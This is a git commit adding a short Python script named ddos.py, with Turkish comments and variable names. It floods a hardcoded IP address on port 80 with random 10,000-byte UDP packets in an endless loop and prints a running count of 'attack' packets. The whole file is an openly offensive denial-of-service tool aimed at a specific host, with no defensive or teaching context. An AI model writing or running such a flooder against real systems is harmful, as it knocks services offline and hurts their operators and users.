b9216902f4bc8f3df7362eacd04af3b7fd19a520
yusiqo <80514373+yusiqo@users.noreply.github.com>
2022-04-17 18:24:17 +0400

    Update ddos.py

--- ddos.py
+++ ddos.py
@@ -1,1 +1,18 @@
 
+import socket
+import random
+import os
+
+
+
+hedef_ip="212.175.170.116"
+hedef_port="80"
+
+bytes=random._urandom(10000)
+sock=socket.socket(socket.AF_INET,socket.SOCK_DGRAM)
+
+sayac=0
+while True:
+	sock.sendto(bytes,(hedef_ip,hedef_port))
+	sayac=sayac+1
+	print("saldiri baslatildi,gonderilen paket:%s"%(sayac))
